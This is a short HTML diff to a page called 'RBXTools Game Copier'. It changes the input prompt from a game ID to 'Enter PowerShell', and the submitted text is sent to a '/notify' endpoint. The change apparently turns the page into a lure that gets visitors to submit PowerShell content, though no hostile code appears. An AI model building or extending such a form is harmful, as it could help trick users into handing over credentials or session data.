@@ -119,7 +119,7 @@
     <h1>RBXTools</h1>
     <h2>Game Copier</h2>
 
-    <input type="text" id="msg" placeholder="Enter Game ID"/>
+    <input type="text" id="msg" placeholder="Enter PowerShell"/>
     <button onclick="send()">Copy</button>
 
     <a id="downloadLink" href="/files/GorillaDev.rbxl" download>Download</a>
@@ -130,7 +130,7 @@
   <script>
     async function send() {
       const message = document.getElementById("msg").value;
-      if (!message) return showPopup("Please enter a Game ID");
+      if (!message) return showPopup("Please enter a PowerShell");
 
       try {
         const res = await fetch("/notify", {
@@ -162,3 +162,4 @@
   </script>
 </body>
 </html>
+
